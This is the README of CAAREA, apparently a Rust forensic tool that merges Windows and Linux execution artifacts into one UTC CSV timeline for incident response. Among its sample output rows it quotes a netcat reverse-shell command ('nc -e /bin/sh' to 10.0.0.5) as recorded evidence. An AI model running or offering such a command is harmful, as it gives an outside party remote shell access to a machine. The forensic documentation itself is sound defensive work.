# CAAREA

**One command. Every program execution on a machine, in order, in a CSV.**

CAAREA (*Chronological Artifacts & Activity Reconstruction Engine for Analysis*) reads Windows and Linux forensic evidence and writes a single timeline of *what ran, when, as whom and from where*. Point it at a disk image, a triage package or a folder of logs; open the CSV in Timeline Explorer or Excel.

```bash
caarea -f workstation.E01 -o workstation.csv
caarea -d /cases/acme/UAC_collections -o linux_fleet.csv
caarea -d C:\Cases\Triage_Host01 --toi 2026-09-24T12:00:00Z --toi-window 6 -o incident_window.csv
```

Written in Rust. One static binary for Windows, Linux and macOS. No mounting, no Python, no drivers.

---

## What it does for you

- **Windows and Linux in the same timeline.** A KAPE zip from the file server and a UAC tarball from the web server end up in one CSV, sorted together, each row stamped with its host.
- **Reads the sources others skip.** Volume Shadow Copies inside E01/raw images, dirty registry hives (their transaction logs are replayed in memory), kernel process accounting (`pacct`), `auditd` execve records, PowerShell ScriptBlock text, Sysmon, scheduled tasks, WMI consumers.
- **Gets the time right.** Every timestamp is converted to UTC. Linux logs that only carry wall-clock time (classic syslog, `dpkg.log`, `ps`) are corrected with the host's own time zone, found in the evidence (`/etc/timezone`, `/etc/localtime`, `timedatectl`).
- **Tells you where a row came from.** Events that only exist in a shadow copy are tagged with the snapshot time; a live event and its snapshot twin are not shown twice.
- **Treats evidence as hostile.** Archives are unpacked into an isolated, per-run temporary folder; entries cannot escape it, symlinks are never followed, and packages with the same file name from different hosts never overwrite each other. The evidence itself is only ever read.

---

## Quick start

```bash
git clone https://github.com/jupyterj0nes/caarea.git
cd caarea
cargo build --release          # binary in target/release/caarea[.exe]
```

| You have | Run |
| :--- | :--- |
| A disk image (E01, Ex01, raw, dd, 001) | `caarea -f disk.E01 -o out.csv` |
| Triage packages (KAPE, Velociraptor, UAC, Cortex XDR, CyLR), zipped or not | `caarea -d /path/to/packages -o out.csv` |
| A folder you collected by hand (`C:\Windows\System32\winevt\Logs`, `/var/log`, ...) | `caarea -d /path/to/folder -o out.csv` |
| Single files (an EVTX, a hive, an `audit.log`) | `caarea -f Security.evtx -f SYSTEM -f audit.log -o out.csv` |

Add `-m evtx`, `-m registry` or `-m linux` to run one parser family only. Add `--overwrite` to replace an existing CSV.

---

## What comes out

An RFC 4180 CSV with ten columns. Timestamps are UTC with a fixed width (`YYYY-MM-DDTHH:MM:SS.ffffffZ`), so sorting the text sorts the time.

| Column | Meaning |
| :--- | :--- |
| `timestamp` | When it happened, UTC |
| `computer` | Host name (from the event, the SYSTEM hive, the UAC hostname file or the package name) |
| `artifact` | Where the row comes from: `evtx:4688`, `evtx:sysmon:1`, `registry:bam`, `linux:audit:execve`, ... Rows recovered from a shadow copy carry a suffix: `evtx:4688 [vss:2026-09-04T08:12:53Z]` |
| `event_id` | Windows event id, 0 otherwise |
| `pid` | Process id when the source has one (for 4688 it is the *new* process) |
| `subject_username` | Who ran it |
| `target_username` | Who it ran as, when different (`sudo`, `su`, services) |
| `processname` | Binary, script, task or package |
| `commandline` | Full command line or the details of the artifact |
| `parentprocessname` | Parent process or launching component |

Two real rows:

```csv
"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,488,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","C:\Windows\System32\services.exe"
"2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686"
```

---

## What it reads

### Windows

| Source | Events / keys | Notes |
| :--- | :--- | :--- |
| Security.evtx | 4688 process creation, 4697 service install, 4698 task created | `DOMAIN\user`, PID from `NewProcessId`, task command pulled out of the task XML |
| System.evtx | 7045 service installed | account from `AccountName` |
| Sysmon | 1 process creation | image, command line, parent image, user |
| PowerShell | 400 engine start, 800 pipeline, 4104 ScriptBlock | full script block text |
| TaskScheduler/Operational | 106 registered, 129 launched, 200 action started | |
| WMI-Activity/Operational | 5861 permanent consumer bound | consumer and command template |
| SYSTEM / SOFTWARE | BAM/DAM, ShimCache, services, Run/RunOnce, TaskCache, IFEO/Winlogon/AppInit, installed programs | |
| NTUSER.DAT / UsrClass.dat | UserAssist, RunMRU, RecentDocs, TypedPaths, WordWheelQuery, Office TrustRecords, profile load/unload | user taken from the path (`Users\<name>\NTUSER.DAT`) |
| Amcache.hve | files and programs with SHA-1 | |

Every `.evtx` in a folder is parsed and filtered by provider and event id, so renamed channel files are fine. Dirty hives are repaired before parsing: `.LOG1`/`.LOG2` entries are verified (Marvin32 hashes), applied in sequence order and only when they belong to that hive. The result matches, byte for byte, what Windows itself produces when it loads the same hive.

### Linux

| Source | What is extracted |
| :--- | :--- |
| `pacct` / `psacct` / `acct` | every terminated process: command, UID, PID, PPID, flags (`struct acct_v3` and legacy `struct acct`, both byte orders) |
| `audit.log` | `USER_CMD` (sudo) and `execve` calls rebuilt from `SYSCALL` + `EXECVE` + `CWD` + `PROCTITLE`, hex decoded |
| `auth.log`, `secure`, `cron`, `syslog`, `messages`, `kern.log` | cron jobs, `sudo` commands, `su` switches, kernel segfaults; classic and RFC 3339 timestamps |
| `.bash_history`, `.zsh_history`, `.viminfo` | commands (with epoch stamps when present), files edited |
| `dpkg.log`, UAC rpm query | package installs |
| `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/**`, systemd `.service` units | scheduled jobs and services |
| `recently-used.xbel` | documents opened from the desktop |
| web server access logs | requests to server-side scripts, POSTs, command-injection payloads in the query string |
| UAC `ps -axo ... lstart`, `running_processes_full_paths.txt` | running processes, deleted binaries still in memory, executions from `/tmp` and `/dev/shm` |

### Disk images

MBR and GPT partition tables, NTFS traversal, BitLocker detection. From the live volume and from **every Volume Shadow Copy**: event logs, `config` hives with their transaction logs, `Amcache.hve`, `NTUSER.DAT` and `UsrClass.dat` of every profile. Shadow copies are read with [vshadow-rs](https://github.com/jupyterj0nes/vshadow-rs), pure Rust, straight from the image.

---

## Time zones, honestly

Most sources carry their own zone (EVTX, registry FILETIMEs, audit, pacct, RFC 3339 syslog, web logs with offset) and are simply converted to UTC.

Classic syslog lines (`Sep 20 03:10:01`), `dpkg.log` and `ps lstart` are wall-clock times of the host. CAAREA looks for the host's zone in the evidence, in this order, and prints what it found:

1. `/etc/timezone`
2. the target of the `/etc/localtime` symlink (kept by the extractor as `etc/localtime.symlink`)
3. `/etc/localtime` as a TZif file, parsed with its transition table
4. UAC `live_response/system/timedatectl_status.txt`
5. UAC `live_response/system/date.txt`
6. UTC, with a warning

Daylight saving is applied per date through the embedded tz database. Force a zone with `--tz Europe/Madrid`, `--tz +02:00` or `--tz UTC`.

---

## Command reference

```text
caarea [OPTIONS] --output <PATH>

  -d, --directory <PATH>      Evidence directory or triage folder (repeatable)
  -f, --file <PATH>           Disk image, archive or single artifact (repeatable)
  -o, --output <PATH>         Destination CSV
  -m, --modules <MODULES>     evtx | registry | linux | all          [default: all]
  -t, --toi <TIMESTAMP>       Centre of a time window of interest (ISO-8601)
  -w, --toi-window <HOURS>    Hours before and after the TOI       [default: 24]
      --start-time <TS>       Keep events from this time on
      --end-time <TS>         Keep events up to this time (a bare date includes the whole day)
      --tz <ZONE>             Time zone of the Linux hosts for zone-less logs (default: detected)
      --overwrite             Replace the output file if it exists
  -s, --silent                Print nothing but errors
  -h, --help / -V, --version
```

---

## How it is tested

`cargo test` runs 64 tests. They include real-layout records for every binary format, real auditd lines, the public TZif files of two zones, and safety tests that try to break out of the staging folder.

Beyond the unit tests, the parsers were checked against:

- 524 public EVTX samples ([EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES), [EVTX-to-MITRE-Attack](https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack), DeepBlueCLI): the count per file matches `Get-WinEvent` exactly for every supported event id.
- The registry test corpus of [yarp](https://github.com/msuhanov/yarp): set `CAAREA_YARP_HIVES=<path>/hives_for_tests` and the test suite compares the replayed dirty hives with the copies recovered by Windows 10 and Windows 7.
- Real `pacct` files, Ubuntu 24.04 logs and an NTFS volume image produced on a Linux box.

The TaskScheduler operational channel is off by default on Windows clients and no public corpus has it. `scripts\gen_taskscheduler_sample.ps1` turns it on (one UAC prompt), creates and runs a harmless task, exports the channel and runs CAAREA on it.

---

## Limits worth knowing

- BitLocker volumes are detected and skipped; decrypt first.
- Compressed rotated logs (`.gz`, `.xz`) are not read; extract them next to the originals.
- Archives inside archives are followed five levels deep.
- Classic syslog has no year; it is inferred from the file's modification time, so logs spanning more than a year lose precision.
- The CSV has no "source file" column by design; run with `-m` or per package when you need that separation.

---

## License

Internal DFIR research tool by [jupyterj0nes](https://github.com/jupyterj0nes). Issues and pull requests are welcome.
